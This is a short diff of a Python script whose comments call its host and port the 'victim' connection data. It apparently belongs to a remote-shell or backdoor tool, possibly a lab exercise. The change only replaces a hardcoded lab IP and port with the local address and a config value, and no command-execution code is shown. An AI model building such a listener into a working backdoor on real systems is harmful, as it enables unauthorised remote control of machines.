@@ -1,10 +1,12 @@
 #Necessary imports - both standard Python modules
 import socket
 import subprocess
+import config
+
 
 #Connection data of victim. Port number has to be >4 digits in order to prevent interfering with specific reserved ports
-HOST = "192.168.56.105"
-PORT = 65432
+HOST = socket.gethostbyname(socket.gethostname())
+PORT = config.port
 
 #Prints connection data of victim
 print("--- victim ip/port: " + str(HOST) + "/" + str(PORT) + "---\n")
